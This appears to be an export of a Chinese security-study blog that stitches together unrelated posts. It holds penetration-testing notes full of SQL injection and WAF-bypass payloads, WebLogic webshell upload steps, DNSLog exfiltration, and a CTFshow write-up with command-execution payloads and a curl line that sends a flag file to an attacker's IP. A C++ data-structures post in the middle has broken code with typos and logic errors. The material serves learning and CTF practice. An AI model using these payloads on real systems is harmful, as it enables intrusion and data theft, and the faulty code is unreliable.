其他群聊\n\n{% endpullquote %}\n\n## DAY 10 其他资产监控\n\nGitHub监控：便于收集整理最新exp或poc，发现相关测试目标的资产\n\n域名搜集：枚举爆破，利用漏洞，主站爬取，whois查询\n\n\n\n# WEB漏洞\n\n## DAY 11 web漏洞 基础\n\nWEB漏洞类型\n\n{% pullquote mindmap mindmap-md %}\n\n- WEB漏洞\n  - 常见\n    - SQL注入\n      - 危害：获取到隐秘数据，获取管理员账号密码等\n    - 文件上传\n    - XSS跨站\n    - 文件包含\n    - 反序列化\n    - 代码执行\n    - 逻辑安全\n    - 未授权访问\n  - 不常见\n    - CSRF\n    - SSRF\n    - 目录遍历\n      - 产生原因：为方便将需要访问的文件定义成变量，未对传入的文件目录进行过滤，导致某些文件被读取\n      - 危害：服务器中的隐私文件被读取\n      - 攻击方式：扫，往死里扫\n    - 文件读取\n    - 文件下载\n    - 命令执行\n    - XXE安全\n    - 其他\n\n{% endpullquote %}\n\n\n\n## DAY 12，13 web漏洞 SQL注入 简要注入 MySQL注入\n\n**数据库注入基本流程**\n\n首先明确数据库的类型和权限\n\n然后明确提交的方法和参数类型等\n\n注入成功后首先明确数据库记录信息的系统表\n\n然后依次对进行库表列数据进行注入查询\n\n最终目的找到网站后台并登陆尝试获取shell\n\n如果权限较高可通过文件读写，命令执行和注册表读取来getshell\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入\n  - 数据库类型\n    - Access\n    - Mysql\n    - Mssql\n    - Oracle\n    - Postsql\n    - SQLite\n    - Mongodb\n    - 其他\n  - 回显/盲注\n    - 回显注入\n    - 无回显注入\n    - 延时盲注\n    - 布尔盲注\n  - 提交方法\n    - GET\n    - POST\n    - COOKIE\n    - REQUEST\n    - HTTP头\n  - 数据类型\n    - 数字型\n    - 字符型\n    - 搜索型\n  - 查询方式\n    - select\n    - insert\n    - delete\n    - update\n    - order by\n  - 注入拓展\n    - 加解密注入\n    - JSON注入\n    - LADP注入\n    - DNSlog注入\n    - 二次注入\n    - 堆叠查询\n  - WAF绕过\n    - 更改提交方法\n    - 大小写混合\n    - 解密编码类\n    - 注释符混用\n    - 等价函数替换\n    - 特殊符号混用\n    - 借助数据库特性\n    - HTTP参数污染\n    - 垃圾数据溢出\n  - 防御方案\n    - 代码加载过滤\n    - WAF产品部署\n\n{% endpullquote %}\n\n\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入流程\n  - 信息收集\n    - 操作系统\n    - 数据库名\n    - 数据库用户\n    - 数据库版本\n    - 其他(网站路径等)\n  - 数据注入:同数据库\n    - 低版本：使用暴力查询或者结合读取查询(MySQL 5.0以下)\n    - 高版本：使用information_schema有据查询(MySQL 5.0以上)\n  - 高权限注入\n    - 常规查询\n    - 跨库查询\n    - 文件读写\n\n{% endpullquote %}\n\nMYSQL数据库\n\n- 网站A---->数据库A\n  - 表A\n    - 列A\n      - 列A数据\n    - 列B\n      - 列B数据\n  - 表B......\n- 网站B---->数据库B......\n\n###### MySQL数据库注入\n\nMySQL 5.0以上自带一个information_schema表记录了所有数据库名,表名,列名的数据库,相当于可以通过它获取指定数据库下面的表名和列名信息\n\ntips:数据库中的“.”符号表示下一级,如user.member就是user库下的menber表\n\ninformation_schema.tables\t记录所有表名信息\n\ninformation_schema.columns\t记录所有列名信息\n\ntable_name\t表名\n\ncolumn_name\t列名\n\n1. **测试是否存在SQL注入**\n\n```\nSELECT * FORM users WHERE id=1 and 1=1 LIMIT 0,1 \n回显正常\nSELECT * FORM users WHERE id=1 and 1=2 LIMIT 0,1\n回显错误\n```\n\n2. **猜测字段数**\n\n```\norder by\t\t\t\t\t\t测试字段数量\nunion select 1,2,3\t判断回显位置\n```\n\n3. **信息收集**\n\n```\n数据库版本:version()\n数据库名:database()\n数据库用户:user()\n操作系统:@@version_compile_os\n```\n\n4. **查询指定数据库下表名,列名,任意数据**\n\n查表名\n\n```\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\n查列名\n\n```\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name=\"刚刚查出的表名\" and table_schema=\"数据库名\"\n```\n\n查数据\n\n```\nunion select 1,2,group_concat(想查询的列) from 数据库名.表名\n```\n\n**文件读写操作**\n\n目的：getshell\n\n```\nselect load_file('文件位置')\t读取文件\nselect 'X' into outfile 文件位置\n```\n\nmysql 新版本下**secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。**在这个参数之外的位置读取文件会返回NULL\n\n一个load_file小提示：https://blog.csdn.net/weixin_30292843/article/details/99381669\n\n**文件路径的常见获取方法**：\n\n报错显示：通过输入错误内容导致函数执行出错，报错显示出文件路径\n\n遗留文件：phpinfo等\n\n漏洞报错：各种框架的问题\n\n平台配置文件：如apache，nginx，IIS等中间件\n\n爆破等\n\n###### 防注入：\n\n**自带防御：PHP中的魔术引号开关和addslashes()函数**\n\n`magic_quotes_gpc`开关被打开时`（magic_quotes_gpc=ON）`或输入内容被`addslashes`函数处理后时输入数据中含有单引号，双引号，反斜杠与NULL字符，都会被自动加上反斜杠，阻止SQL注入\n\n解决方案：进行16进制编码，MySQL能自动将十六进制转化为字符串执行\n\n**内置函数认证**\n\n没救了\n\n**关键字验证**\n\n可尝试大小写绕过\n\n**WAF防护**\n\n找方法（见上方导图）尝试吧\n\n**SQLMAP** \n\n\n\n## DAY 14 web漏洞 SQL注入 注入类型 提交注入\n\n**提交参数类型：**\n\n数字，字符，搜索，JSON等\n\n**请求方法：**\n\nGET，POST，COOKIE，REQUEST，HTTP HEADER等\n\n**PHP内置变量**\n\n$_GET（GET传参内容）\n\n$_POST（POST传参内容）\n\n$_REUQEST（GET和POST传参内容）\n\n$_SERVER（与服务器有关内容）\n\n\n\n**SQL语句干扰符号，看情况进行闭合或注释**\n\n'，\"，%，)，}等\n\n\n\n**数字型：**无引号包裹\n\n**字符型：**有引号包裹，需要闭合\n\n\n\n## DAY15 web漏洞 SQL注入 Oracle，MongoDB等注入\n\n当注入到一个不熟悉的数据库时，可搜索对应数据库的函数来帮助我们\n\n数据库的用户权限是由连接SQL的配置文件决定的\n\n\n\n**不同数据库的结构**\n\n- **Access**（.mdb文件）\n  - 表名\n    - 列名\n      - 数据\n\n特点：不同数据库是分离的，没啥功能\n\n\n\n- **MySQL，MSSQL等**\n  - 数据库名\n    - 表名\n      - 列名\n        - 数据\n\n\n\n\n\n\n- MSSQL\n\n特点：执行系统命令、读取注册表、读文件、写文件、下载远程文件、导出数据到指定的数据库服务器（能干的事贼多）\n\n\n\n**不同数据库注入命令**\n\n- Access\n\n```\n猜测字段\norder by 3\n获取表名（字典猜）\nunion select 1,2,3 from xxxx\n如果xxxx表存在就会返回数据，没有则空\n获取列名（字典猜）\nunion select 1,xxx,3 from xxxx\n如果xxx列存在就会返回数据，没有则空\n```\n\n- MSSQL\n\n```\n判断数据库类型\nand exists (select count(*) from sysobjects) 返回正常为MSSQL\n判断数据库版本\n有回显：and 1=@@version--\n无回显：and substring((select @@version),22,4)='2008'--无回显，2008即为版本，报错说明不是\n注入点权限判断\nselect is_srvrolemember('sysadmin');  判断当前是否为sa\nselect is_srvrolemember('db_owner');  判断当前用户写文件、读文件的权限（db_owner）\nselect is_srvrolemember('public');  判断是否有public权限，可以爆破表\n```\n\n- PostgreSQL\n\n```\n猜测字段\norder by 3\n获取当前数据库\nunion select null,null,current_database()--\n用户名：user\n用户权限：current_schema()\n会话用户：session_user\n获取表名\nunion select null,string_agg(relname,','),null,null from pg_stat_user_tables\n获取列名\nunion select null,string_agg(column_name,','),null,null from information_schema.columns\n获取数据\nunion select null,string_agg(xxxxx,','),null,null from 表名\n```\n\n- Oracle\n\n```\n猜测字段\norder by 3\n判断字段类型\nunion select null,null,'null' from dual 如果回显正常则说明3位置是数字型，反之则为字符型\n确定回显位置\nunion select 1,2,'3' from dual 假设1,2为数字，3为字符\n获取表名\nunion select 1,(select table_name from user_tables where rownum=1) from dual\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual 以此类推爆出所有表名\n\n获取列名\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）') from dual\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）' and culumn_name not in ('第一个字段')) from dual 以此类推爆出所有表名\n获取数据\nunion select 1,字段1||字段2||字段3...||字段n from 表名 where rownum=1 -- 在Oracle中group_concat只能联俩\n\n```\n\n- MangoDB：用NoSQLAttack打 \n\n```\n$ne关键字，意味不等于\nMangoDB进行操作时应当先将前面的对象闭合'});return ({\n获取当前数据库\ntitle:tojson(db),xxx:'1\ndb.getCollectionNames()函数获取到的是数组，需要用tojson函数转化为字符串 \n获取所有集合（表）\ntitle:tojson(db.getCollectionNames()),xxx:'1\n获取所有字段\ndb.Authority_confidential为当前使用的表\nfind函数用于查询，[0]为第一条数据\ntitle:tojson(db.Authority_confidential.find()[0])\n```\n\n**SQLMAP，NoSQLAttack，Pangolin**\n\n\n\n\n\n\n\n## DAY16 web漏洞 SQL注入 查询方式 报错盲注\n\n**数据库的查询方式**\n\n```\nselect 查询数据（最常见的）\n在网站中进行数据显示查询的操作\n例：select * from users where id=$id\n\ninsert 插入数据\n在网站中进行用户注册添加等操作\n例：insert into users(id,name,password) values(1,'Jlan','pass')\n\ndelete 删除数据\n后台管理中删除的操作\n例：delete from users where id=$id\n\nupdate 更新数据\n后台管理数据同步或缓存等操作\n例：update user set password='newpass' where id=1 and name='Jlan'\n\norder by 排序数据\n一般结合表名或列名进行数据排序操作\n例： select * from users order by $id\n\n可以通过以上查询方式与网站应用的关系\n通过注入点产生的地方或应用猜到对方的SQL查询方式\n\n```\n\n**盲注**\n\n**内容：**盲注就是在注入过程中，获取的数据不能回显至前端页面，此时我们需要利用一些方法进行判断或尝试，这个过程称为盲注\n\n**分类：**布尔盲注（逻辑判断），时间盲注（延时判断），报错盲注（报错回显）\n\n**常用函数：**\n\nlike 'xxx%'\t判断xxx或xxx...是否成立\n\nregexp '^xxx[a-z]'\t匹配xxx以及xxx...等\n\nif(条件,返回值真,返回值假)\n\nsleep(时间秒)\n\nmid(字符串,起始位置,截取长度)\n\nsubstr(字符串,起始位置,截取长度)\n\nleft(字符串,截取长度)\n\nlength(字符串)\n\nord=ascii\n\nascii(字符)=ascii值\n\n**报错盲注**\n\n常用函数：`floor,updatexml,extractvalue`\n\nextractvalue函数：\n\n语法：`extractvalue(目标xml文档,xml路径)`\n\n报错：当目标xml文档不存在时会返回xml路径\n\n1、通过floor报错,注入语句如下:\n`and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)`\n\n2、通过ExtractValue报错,注入语句如下:\n`and extractvalue(1, concat(0x7e,想查询的内容,0x7e))`\n\n3、通过UpdateXml报错,注入语句如下:\n`and 1=(updatexml(1,concat(0x7e,(select database())),1))`\n\n剩下的可参考这篇文章：https://www.jianshu.com/p/bc35f8dd4f7c\n\n**布尔盲注**\n\n返回页面只有正确与否两种形式，通过if语句以及返回值来得到结果\n\n\n\n\n\n\n\n**时间盲注**\n\n常用函数：`if,sleep`\n\nif函数：\n\n语法：if(条件,返回值真,返回值假)\n\nsleep函数：\n\n语法：sleep(时间（单位为秒）)\n\n用法：~~乖乖用sqlmap啊喂~~\n\n可以先用`length()`判断长度\n\n`and sleep(if(database()='a',5,0))`\n\n**Access偏移注入**\n\n**偏移注入主要是针对知道表，但是不知道字段的。**\n\n~~可以先试试看看源代码中表单的值或者URL特征等~~\n\n```\n首先猜测表：select exists(select * from sys_admin);\n然后爆出字段数：order by x\n然后爆出显示位：union select 1,2,3,4,5....,x from sys_admin\n爆出显示位的基础上依次递减，直到页面恢复正常为止：union select 1,2,3,4,5....,y,* from sys_admin\n最终字段数就等于c=x-2*(x-y)\n一级偏移语句： union select 1,2,3,4,5....c,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)\n```\n\n## DAY17 web漏洞 SQL注入 二次注入 加解密 DNS等注入\n\n**加密解密**\n\n查看抓包内容中是否有加密后的字符串，尝试解密后进行注入时应先进行加密再进行\n\n**二次注入**\n\n在首次进行注册等写入数据库的操作时，将SQL语句写入数据库，在更新数据等操作被执行时，调用出前面构造好的SQL语句导致注入\n\n```\n例子：\n原始语句：\nupdate set password='$new_pass' where username='$user' and password='$current_pass'\n当Jlan正常执行该语句时\nupdate set password='123456' where username='Jlan' and password='000000'\n但是如果有个人尝试二次注入构造出以下用户名\nusername=Jlan'#\n此时这个人尝试更改密码，将会执行下列语句\nupdate set password='123456' where username='Jlan'#' and password='000000'\n#后面的语句全被忽略了，所以真正执行的是下面的语句\nupdate set password='123456' where username='Jlan'\n此时黑客虽然没有拿到Jlan的密码但却成功更改了Jlan的密码，完成二次注入\n```\n\n**DNSLog外带注入**（仅支持Windows）\n\n该方法使用条件\n\n- secure_file_priv **拥有读写权限**\n\n```sql\nsecure_file_priv = \"\"       # 可以读取磁盘目录\nsecure_file_priv = \"D:\\\"    # 可以读取D盘文件\nsecure_file_priv = null     # load_file限制，不能加载文件\n```\n\n- 在mysql 5.5.34 默认为空可以加载文件，之后的版本为NULL，不能加载文件\n\n```\nshow global variables like 'secure%';  //查看是否有写限制\n```\n\n在读写文件条件严苛时，可尝试load_file函数将数据带出\n\n```\nload_file(concat('\\\\\\\\',(想要带出的内容),'.你的URL\\\\kkk'))\n```\n\n此时load_file函数会尝试将访问URL，通过我们构造的URL即可将数据带出\n\n## DAY18 web漏洞 SQL注入 堆叠注入 WAF绕过\n\n**堆叠查询注入**\n\n将多条语句进行执行，使用分割符进行分割，可以直接进行一个数据的插入\n\n限制：只有部分数据库（MySQL）支持堆叠注入\n\n**WAF绕过**\n\n{% pullquote mindmap mindmap-md %}\n\n- WAF绕过\n  - 数据\n    - 大小写\n    - 加密解密\n    - 编码解码\n    - 等价函数\n    - 特殊符号\n    - 反序列化\n    - 注释符混用\n  - 方式\n    - 更改提交方式\n    - 变异\n  - 其他\n    - Fuzz大法\n    - 数据库特性\n    - 垃圾数据已出\n    - HTTP参数污染\n\n{% endpullquote %}\n\n**数据库特性**\n\nMySQL：\n\n```\n/*!50001 语句*/;\n意为只有5.00.01以上版本数据库才会执行\n```\n\n**绕过**\n\n1. ```\n   union#kkk%0Aselect 1,2,3#\n   %0A意为换行符，所以最终执行的语句如下\n   union \n   select 1,2,3#\n   ```\n\n2. IP白名单绕过\n\n   ```\n   构造HTTP请求头\n   \n   \n   ```\n\n3. 访问静态资源（旧版本WAF有效）\n\n   ```\n   /index.php/1.txt/?id=payload\n   ```\n\n4. URL白名单（旧版本WAF有效）\n\n   ```\n   WAF可能对管理页面等不进行拦截，可以尝试插入admin,manage,admin等来尝试匹配绕过\n   /?a=/admin/&id=payload\n   ```\n\n5. 构造爬虫\n\n   ```\n   尝试伪造搜索引擎等爬虫的UA，WAF可能放行\n   ```\n\n\n**HTTP参数污染**\n\n示例：\n\n```\n?id=1/**&id=-1 union select 1,2,3#*/\n当我们使用上面的语句传参时，WAF收到的id参数如下\n1/**&id=-1 union select 1,2,3#*/\n可见我们攻击内容包含在注释中，被WAF忽略，但实际上PHP接收到的参数如下\nid=-1 union select 1,2,3#*/\n成功执行了联合查询\n```\n\n\n\n- Apache+PHP 取后面参数\n- Tmocat+JSP 取前面参数\n- Apache+Perl 取前面参数\n- Apache+Python 取所有参数生成List\n- IIS+ASP 取所有参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY20  web漏洞 文件上传\n\n文件上传漏洞\n\n{% pullquote mindmap mindmap-md %}\n\n- 文件上传漏洞\n  - 验证/绕过\n    - 前端\n      - JS防护\n\n    - 后端\n      - 黑名单\n        - 特殊解析后缀\n        - .htaccess解析\n        - 大小写绕过\n        - 点绕过\n        - 空格绕过\n        - ::$$DATA绕过\n        - 配合解析漏洞\n        - 双后缀名绕过\n\n      - 白名单\n        - MIME绕过\n        - %00截断\n        - 0x00截断\n        - 0x0a截断\n\n      - 内容及其他\n        - 文件头检测\n        - 二次渲染\n        - 条件竞争\n        - 突破getimagesize\n        - 突破exif_imagetype\n\n- 漏洞/修复\n  - 解析漏洞\n    - IIS6/7.x\n    - Apache\n    - Nginx\n\n  - CMS漏洞\n  - 编辑器漏洞\n    - fckeditor\n    - ewebeditor\n    - ckeditor\n    - kindedit\n\n  - CVE等漏洞\n    - CVE-2015-5253\n    - CVE-2017-12615\n    - CVE-2019-2618\n\n- WAF绕过\n  - 安全狗\n  - 宝塔\n  - 云盾\n\n\n{% endpullquote %}\n\n{% pullquote mindmap mindmap-md %}\n\n- 利用思路\n  - 常规\n    - 扫描获取上传\n    - 会员中心上传\n    - 后台系统上传\n    - 各种途径上传\n  - CMS\n    - 已知CMS源码\n  - 编辑器\n    - ckeditor\n    - fckeditor\n    - kindeditor\n    - xxxxeditor\n  - 其他\n    - 代码审计\n    - 平台或第三方应用等\n\n{% endpullquote %}\n\n**nginx解析漏洞**\n\n```\n原理：Nginx拿到文件路径/test.jpg/1.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/1.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access denied.”。\n\n这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项可帮助“修理”路径，举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。\n\n而在新版本的php中该漏洞可能不成功是因为新的php引入了“security.limit_extensions”，限制可执行文件的后缀，默认只执行.php文件\n```\n\n在上传后的文件中加/xxx.php可尝试解析漏洞\n\n**Weblogic任意文件上传漏洞（CVE-2018-2894）**\n\n[复现链接](https://blog.csdn.net/weixin_43625577/article/details/97001677)\n\n利用条件：Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，**进而获取服务器权限**\n\n影响版本：weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。\n\n```\n在base_domain中的‘高级’中勾选‘启动Web服务测试页’选项，保存配置\n访问/ws_utc/config.do\n设置Work Home Dir为\n/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css，访问这个目录是无需权限的，这一点很重要。\n然后点击‘安全’——>‘添加’，上传jsp木马\n审查查看时间戳\n访问/ws_utc/css/config/keystore/[时间戳]_[文件名]即可执行webshell\n```\n\n\n\n\n\n**文件上传骚操作**\n\n某些网站在文件上传后不会立刻提交数据包到后端，而是先在本地预览，等用户二次确认后才会将数据进行传输，并且大部分不使用普通的POST文件传输，而是经过加密的字符串，就离谱\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY25 web漏洞 XSS跨站\n\n产生原理\n\n上传了JS代码网页渲染导致的\n\n危害影响\n\n反射型：数据不会被存储到服务器\n\n存储型：数据被存储到数据库\n\nDOM型\n\n生效特点\n\n反射型\n\n提交x——>后端——>执行返回结果\n\n存储型\n\n提交x——>后端存储——>取出数据——>执行结果\n\nDOM型\n\n提交x——>本地浏览器静态前端代码执行——>被提交到后端执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"数据结构","url":"/posts/1106.html","content":"\n# 数据结构\n\n## 线性结构\n\n### 线性表顺序结构实现\n\n<!--more-->\n\n```C++\n//数组静态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType data[MaxSize];\n\tint length;\n}SqList;\n\n//数组动态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType *data;\n\tint length\n}SqList;\nSqList L;\nL.data=(ElementType*)malloc(sizeof(ElementType)*MaxSize);\n//#include <cstdlib>\n//malloc(m)函数，开辟m字节长度的地址空间，并返回这段空间的首地址\n//sizeof(x)运算，计算变量x的长度\n//free(p)函数，释放指针p所指变量的存储空间，彻底删除一个变量\n//typedef type name 定义种类为type的变量种类\n\n\n//各种功能实现\n//函数结果状态代码\n#define TRUE 1\n#define FALSE 0\n#define OK 1\n#define ERROR 1\n#define INFEASIBLE -1\n#define OVERFLOW -2\n//Status是所有函数的类型，值是函数结果状态代码\ntypedef int Status;\n\n//线性表初始化\nStatus InitList(SqList &L){\n  L.data=new ElementType[MAXSIZE];\n  if(!L.data)\n    exit(OVERFLOW);//内存开辟失败\n  L.length=0;\n  return OK;\n}\nvoid DestoryList(SqList &L){\n  if(L.data)\n    delete L.data;\n}\nvoid ClearList(SqList &L){\n  L.length=0;\n}\nint GetLength(SqList L){\n\treturn L.length;  \n}\nbool IsEmpty(SqList L){\n  if(L.length==0)\n    return true;\n  return false;\n}\nint GetElement(SqList L,int i,ElementType &e){\n\tif(i>=1&&i<=L.length){\n    e=L.data[i-1];\n    return OK;\n  }\n  return ERROR;\n}\nint FindElementByNum(SqList L,int num){\n  for(int i=0;i<L.length;i++){\n    if(L.data[i]==num){\n      return i+1;\n    }\n  }\n  return 0;\n}\nStatus Insert(SqList &L,int i,ElementType e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  if(L.length==MAXSIZE)\n    return ERROR;\n  for(int j=L.length-1;j>=i-1;j--){\n    L.data[j+1]=L.data[j];\n  }\n  L.data[i-1]=e;\n  L.length++;\n  return OK;\n}\nStatus Delete(SqList &L,int i,ElementType &e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  e=L.data[i-1]\n  for(int j=L.length-1;i<=j;i++){\n    L.data[i-1]=L.data[i];\n  }\n  L.length--;\n  return OK;\n}\n```\n\n### 线性表链式结构实现\n\n```C++\ntypedef struct{\n\tint num;\n  char name[10];\n  int score;\n}ElementType;\ntypedef struct Lnode{\n\tElementType data;\n\tstruct Lnode *next;\n}Lnode,*LinkList;\nLinkList L;<==>LNode *p\nStatus InitList(LinkList &L){\n  L=new LNode;\n  L->next=NULL;\n  return OK;\n}\nbool IsEmpty(LinkList L){\n  if(L->next==NULL)\n  \treturn 1;\n  return 0;\n}\nStatus DestoryList(LinkList &L){\n  LNode *p;\n  while(L!=NULL){\n    p=L;\n    L=L->next;\n    delete p;\n  }\n  return OK;\n}\nStatus ClearList(LinkList &L){\n  LNode *p,*q;\n  p=L->next;\n  while(L!=NULL){\n    q=p->next;\n    delete p;\n    p=q;\n  }\n  L->next=NULL;\n  return OK;\n}\nint ListLength(LinkList L){\n  int i=0;\n  LinkList p=L->next;\n  while(p!=NULL){\n    i++;\n    p=p->next;\n  }\n  return i;\n}\nint GetElement(LinkList L,int i,ElementType &e){\n\tif(i<1||i>L.length)\n    return ERROR;\n  LinkList p=L;\n  for(int j=1;j<=i;j++){\n    p=p->next;\n  }\n  e=p->data;\n  return OK;\n}\n*LNode FindElementGetAddress(LinkList L,ElementType e){\n  LinkList p=L->next;\n  while(p&&p->data!=e){\n    p=p->next;\n  }\n  return p;\n}\nint FindElementGetNum(LinkList L,ElementType e){\n  LinkList p=L->next;\n  int j=1;\n  whlie(p&&p->data!=e){\n    p=p->next;\n    j++;\n  }\n  if(p)\n    return j;\n  return 0\n}\nStatus Insert(LinkList &L,int i,ElementType e){\n  LinkList p=L;\n  LinkList s;\n  int j=1\n  s->data=e;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!p)\n    return ERROR;\n  LinkList s->next=p->next;\n  p->next=s;\n  return OK;\n}\nStatus Delete(LinkList &L,int i,ElementType &e){\n  LinkList p=L,s;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!(p->next)||j>i-1)\n    return ERROE\n  s=p->next;\n  p->next=s->next;\n  e=s->data\n  delete s;\n  return OK\n}\n//单链表建立方法：头插法\n//1、建立一个空表，重复读入数据\n//2、生成新节点，将读入数据存放到新节点的数据域中\n//3、从最后一个节点开始，依次将各节点插入到链表的前端\nL=new LNode;\np=new LNode;\np->data=a;\np->next=L->next;\nL->next=p;\n  \n//单链表建立方法：头插法\n    \nvoid CreateList_R(LinkList &L,int n){\n\tL=new LNode;\n  L->next=NULL;\n  r=L;\n  for(int i=0;i<n;i++){\n    p=new LNode;\n    cin>>p->data;\n    p->next=NULL;\n    r->next=p;\n    r=p;\n  }\n}\np->data=a;\np->next=NULL;\nr->next=p;//尾指针\nr=p\n    \n//循环链表\n//好处：从表中任意阶段出发均可找到表中其他节点\nLinkList Connect(LinkList &a,LinkList &b){\n  LinkList p=a->next;\n  a->next=b->next->next\n  delete b->next;\n  b->next=p;\n  return b;\n}\n//双向链表\ntypedef struct DuLNode{\n  ElementType data;\n  struct DuLNode *prior,*next;\n}DuLNode,*DuLinkList;\n    \n//线性表合并\nvoid Union(List &La,List Lb){\n  La_len=ListLength(La);\n  Lb_len=ListLength(Lb);\n  for(int i=1;i<=Lb_len;i++){\n    LNode e;\n    GetElement(Lb,i,e);\n    if(!FindElement(La,e))\n    \tInsert(&La,++La_len,e);\n  }\n}\n//有序表合并\nvoid Union(LinkList &La,LinkList &Lb,LinkList &Lc){\n  pa=La->next;\n  pb=Lb->next;\n  pc=Lc=La;\n  while(pa&&pb){\n    if(pa->data<=pb->data){\n      pc->next=pa;\n      pc=pa;\n      pa=pa->next;\n    }\n    else{\n      pc->next=pb;\n      pc=pb;\n      pb=pb->next;\n    }\n    pc->next=pa?pa:pb;\n    delete Lb;\n  }\n}\n    \n    \n    \n  \n    \n    \n    \n    \n    \n    \n    \n    \n  \n  \n  \n  \n  \n  \n\n\n\n```\n\n### 栈和队列\n\n```C++\n//栈只能在表尾进行插入和删除\n//队列只能在表尾插入，表头删除\n```\n\n","tags":["C++"]},{"title":"CTFshow命令执行","url":"/posts/47520.html","content":"\n危险函数：\n\n```\n------------------------------------------------执行(系统)函数\n\t eval\n\t exec - 执行一个外部程序\n\t shell_exec\n\t system\n\t passthru\n\t proc_open\n\t pcntl_exec — 在当前进程空间执行指定程序\n\t pcntl_fork  在当前进程当前位置产生分支（子进程）。\n\t dl — 运行时载入一个 PHP 扩展\n\t unserialize - 反序列化一个类函数nashell\n\t ------------------------------------------------显示源码   \n\t phpinfo\n\t readfile\n\t readline\n\t show_source\n\t heighlight\n\t heighlight_string\n\t curl\n\t php\n   curl -f filename=@/flag [要传到的ip地址和端口]\t\n\t 解释：在linux里面单引号里面的的命令会直接先执行\n\t 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址\n\t 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping\t  命令了只要监听此端口拿到文件即可\n\t file \n\t ------------------------------------------------回调函数\n\t array_walk\n\t array_walk_recursive\n\t array_map\n\t call_user_func_array\n\t call_user_func\n\t ------------------------------------------------数组使用回调函数过滤\n\t array_filter\n\t filter_var\n\t filter_var_array\n\t ------------------------------------------------写入文件\n\t fopen\n\t fwrite\n\t file_put_contents - 将数据写入文件中\n\t file-get-contents - 获取参数的文件资源\n\t move_uploaded_file - 将上传的文件移动到新位置\n\t ------------------------------------------------命令字符串转义\n\t escapeshellcmd - 对特殊字符转义\n\t escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数\n\t ------------------------------------------------其他\n\t proc_terminate — 杀除由 proc_open 打开的进程\n\t touch - 设定文件的访问和修改时间\n```\n\n可用于执行php函数的函数：\n\n```\neval()、assert()、preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//正则规则中含有/e修饰符就存在代码执行漏洞\ncreate_function()\n```\n\n可用于执行系统命令的函数：\n\n```php\nexec()//返回命令执行结果，加echo\npassthru()//执行后直接显示结果\nsystem()//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false\nshell_exec()//返回命令执行结果，加echo\n`命令`//返回命令执行结果，加echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\n可用于替代空格的字符：\n\n```\n%09、$IFS$9、 ${IFS}、$IFS%09、< 、<>、%20等\n```\n\n可用于读取文件的命令：\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\nls / | tee 1.txt\n将ls后的结果写入1.txt中\n```\n\n通配符：\n\n```\n*代表任意位\n?代表一位\n```\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，\\`内部为执行的命令，通过echo得到返回值\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag,system,php，同上\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数`include()`，include可以实现无括号包含，进而通过`?>`将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上\n\n##### 